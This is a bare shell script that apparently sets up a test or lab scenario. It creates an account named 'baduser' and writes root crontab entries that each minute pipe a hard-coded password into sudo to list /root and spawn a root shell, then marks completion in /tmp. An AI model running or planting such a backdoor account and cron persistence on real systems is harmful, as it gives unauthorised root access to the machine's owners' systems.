useradd -m baduser 
echo "* * * * * su - baduser -c 'echo \"1234\" | sudo -S ls /root'" > /var/spool/cron/crontabs/root
echo "* * * * * su - baduser -c 'echo \"1234\" | sudo -S su -'" >> /var/spool/cron/crontabs/root
chown root:crontab /var/spool/cron/crontabs/root
chmod 600 /var/spool/cron/crontabs/root

touch /tmp/finished
